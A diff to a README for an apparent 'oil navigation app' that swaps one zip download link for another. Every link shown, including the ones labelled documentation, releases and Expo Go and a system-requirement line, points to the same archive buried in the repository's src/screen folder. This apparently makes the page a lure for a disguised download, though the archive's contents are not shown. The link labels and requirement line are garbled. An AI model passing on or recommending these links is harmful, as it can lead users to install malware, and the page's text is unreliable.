@@ -1,6 +1,6 @@
 # 🚀 frechette_oil_navf - Simple Oil Navigation App
 
-[![Download frechette_oil_navf](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip)](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip)
+[![Download frechette_oil_navf](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip)](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip)
 
 ## 🛠️ Overview
 
@@ -13,7 +13,7 @@ To run the frechette_oil_navf app, ensure your system meets the following requir
 - **Operating System:** Windows 10 or later / macOS Mojave or later
 - **Memory:** At least 4 GB of RAM
 - **Storage:** Minimum 100 MB free space
-- **https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip** Version 14 or later (if you wish to run the app in development mode)
+- **https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip** Version 14 or later (if you wish to run the app in development mode)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started with frechette_oil_navf, follow these simple steps.
 
 ### 1. 🔗 Download & Install
 
-Visit the [Releases page to download](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip). Choose the file that matches your operating system and click to download.
+Visit the [Releases page to download](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip). Choose the file that matches your operating system and click to download.
 
 ### 2. 🖥️ Install Dependencies (For Development)
 
@@ -82,8 +82,8 @@ For any inquiries related to frechette_oil_navf or if you encounter issues, plea
 
 ## 📥 Important Links
 
-- [Download frechette_oil_navf](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip)
-- [Documentation](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip)
-- [Expo Go](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-v2.5.zip) 
+- [Download frechette_oil_navf](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip)
+- [Expo Go](https://raw.githubusercontent.com/Tuan9803/frechette_oil_navf/main/src/screen/oil-navf-frechette-1.5-beta.3.zip) 
 
 Enjoy using frechette_oil_navf for all your oil navigation needs!
